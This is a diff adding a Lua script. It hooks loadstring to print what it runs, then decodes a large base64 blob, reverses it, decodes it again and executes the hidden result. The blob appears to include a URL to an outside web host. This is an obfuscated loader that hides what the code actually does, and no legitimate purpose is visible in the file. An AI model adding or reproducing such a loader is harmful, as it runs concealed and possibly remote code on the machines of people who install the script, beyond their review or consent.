@@ -1,0 +1,42 @@
+local ppld = loadstring 
+
+loadstring = function (a)
+    print(a)
+    return ppld(a)
+end
+do local function _bwmdpoycev() do local function _zxfilrvehs() do
+    local _xaRIujPC='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    local function d(s)
+        s=s:gsub('[^'.._xaRIujPC..'=]','')
+        return (s:gsub('.',function(x)
+            if x=='=' then return '' end
+            local _WIrhfeZL,f='',(_xaRIujPC:find(x)-1)
+            for i=6,1,-1 do
+                _WIrhfeZL=_WIrhfeZL..(f%2^i-f%2^(i-1)>0 and '1' or '0')
+            end
+            return _WIrhfeZL
+        end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)
+            if #x~=8 then return '' end
+            local _QzvqLOlC=0
+            for i=1,8 do
+                if x:sub(i,i)=='1' then _QzvqLOlC=_QzvqLOlC+2^(8-i) end
+            end
+            return string.char(_QzvqLOlC)
+        end))
+    end
+
+    local _hGobIirv = table.concat({[=[PT1BWnVWR0lwZ1NLNVIyYkM1U016Vm1jb2NtYnBKSGR6UldZdnhHSWxOSGJsQkNadVZHSXBnU0s1UjJiQzVTTXpWbWNvY21icEpIZHpSV1l2eEdJbE5IYmxCQ1p1VkdJcGdTSzVSMmJDNWlNelZtY29jbWJwSkhkelJXWXZ4R0lsTkhibEJTS29rU2VrOW1RdUl6Y2xKSEtuNVdheVIzY2tGMmJzQlNLbjRpTHVjbWJwUldZdngwSm9RbmJwSkhjZzRXWm9SSEl3QWpNZzBUUGdVR1p2TjBjMVJYWTBObEx5]=],[=[TVhaeUJDWnVGR0l5TVhaeUJpWnBCU0s1UjJiQzUyYnpwR0lzc21icHgyWGpObkxrVkdadk5XWmtoQ2R6OUdVdlJHSTlBaU16Vm1jZ3dXWWo5R2JnNFdab1JISXI1V2FzOTFZejVDWmxSMmJqVkdaZ1FtYmhCaUlyOW1JZzBUUGdNWGQwRkdkejVDWmxSMmJqVkdaZ1FtYmhCQ1psUjJialZHWmdZV2Fna1NlazltUXVFemNsSkhLbFIyYmpWR1JPOTBVS3BUWmpsbWR5VjJVd1JIZElCU1BnUVdaazkyWWxS]=],[=[R0lzRjJZdnhHSXVWR2EwQkNNd0lESTkwRElsUjJiRE5YZDBGR2RUNVNNelZtY2dRbWJoQlNNelZtY2dZV2Fna1NlazltUXU5MmNxQkNMc0pYZG9RM2N2QjFia0JTUGdFemNsSkhJc0YyWXZ4R0lrNVdaZ1FtYmxCQ2JwNUdJdUpYZDBWbWNnVTJjc1ZHSXBFWFp5aENkelZXZHhWbWNnNG1jMVJYWnlCaWJsaEdkZ1EzY2xWWGNsSkhJbWxXWnp4V1pna1NjbEpISzBOWFoxRlhaeTlGYzBSSGFnNG1jMVJY]=],[=[WnlCaWJsaEdkZ1EzY2xWWGNsSjNYd1JIZG9CaVpwVjJjc1ZHSXBFWFp5aENkelZXZHhWbWN1NFdlekJpYnlWSGRsSkhJdVZHYTBCQ2R6VldkeFZtY3U0V2V6QkNadUZHSXVsM2NnWVdhZzBISTVSMmJpQlNQZ2tIWnZKRUlzMEhJaUlYWmtGMmJNSjNiMFYzWWxoWFI1MWtJZzBESWRKQ2R1VjJaQjFpY2xOWFZpc0ZJc0lpYnZObmF2NDJicFJYWWpsR2J3QlhZaUFTUGcwbElsQlhlVTFDZHVWR2R1OTJR]=],[=[aXNGSTdCU1BnTW5jbFJXWWxoRUlzSUNWVDlFVWlBU1BnUTJib1JYWk5CQ0xzSlhkZzBESXNKWFZnc0hJOUFTY2xKSElzRjJZdnhHSXBrSFp2SkdJc3dtYzFoQ2R6OUdVdlJHSXU5V2EwTm1iMVpHSXNGMll2eEdJcEVHZGhSVWVrOW1Zb1VHWnZObWJGNTBUVHBrT2xOV2EySlhaVEJIZDBoRUk5QVNlazltUXU5MmNxQkNiaE4yYnNCU2ZnUVdTbDFXWUg1U1p0RjJaZzBESWtsVVp0RjJaZ3dDWkpKMmJL]=],[=[NVNadEYyWmcwRElrbGtZdnBHSXNRV1NsTldZc0JsTGwxV1luQlNQZ1FXU2xOV1lzQkhJc1FXU3lWMmNWNWljbGxYWXNCSEk5QUNaSkpYWnpWSElzVVdiaDVrTHlWV2VoeEdjZzBESXlWV2VoeEdjZ3dDWkpWV2JoZGtMbDFXWW5CU1BnczBZMUJYZUJKbFdvcDJjZ3dDWkpKMmJLNVNadEYyWmcwREl5QW5lUFZGY2d3Q1pKVjJZaHhHVXVVV2JoZEdJOUFTVEtCRFNTQkhJc1FXU3lWMmNWNWljbGxYWXNC]=],[=[SEk5QXlRdEZIT29CQ0xsMVdZTzVpY2xsWFlzQkhJOUFpWjVvWGNTTmxaZ3NISTlBU1kwRkdSNVIyYmlCQ2JoTjJic0JpY2xsWFlzQkZiaE4yYk01eWN5VldlaHhHVXVVV2JoZEdJOUFpY2xsWFlzQkhJc0YyWXZ4R0lpWXpNdkF6YUdCRk93UWpWVVoxTE5wVWF4Y21hSmxuVlZGRFNVZG5TeVZUZFJsWFd2Z21jaUZrYnk5VmVtbG1jbFozTDBWbWJ1a1hZd05YWXM5Mlp2OGlPekJIZDBobUlnMERJc0pY]=],[=[ZGd3V1lqOUdiZ2tpSWxOV2EySlhaVEJIZDBoa0lvVTJZcFpuY2xORmRsZGtPbDFXWW5CU1BnVTJZcFpuY2xORmMwUkhTZ3dXWWo5R2I=]=]})
+
+
+    local _XzOSUrjM = d(_hGobIirv)
+
+
+    _XzOSUrjM = string.reverse(_XzOSUrjM)
+
+
+    local _spdUObAT = d(_XzOSUrjM)
+
+    local _JHhNPrTY, err = loadstring(_spdUObAT)
+    if not _JHhNPrTY then error(err) end
+    _JHhNPrTY()
+end end _zxfilrvehs() end end _bwmdpoycev() end
